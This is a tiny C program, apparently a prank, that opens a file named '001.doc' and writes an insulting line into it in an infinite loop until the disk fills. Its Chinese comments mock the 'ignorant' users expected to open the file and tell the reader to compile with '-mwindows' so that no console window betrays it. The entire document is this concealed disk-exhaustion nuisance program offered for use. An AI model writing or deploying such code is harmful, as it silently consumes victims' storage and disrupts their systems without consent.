#include <stdio.h>

int main(int argc, char* argv[]){
// 一般无知的人需要打开的比较重量的就是office了吧，doc正好满足你们，滑稽
// 编译时 记得 gcc -mwindows 哦
    FILE *fp = fopen("001.doc", "w+");
    for(;;)
        fprintf(fp, "f@ck U\n");
    return 0;
}
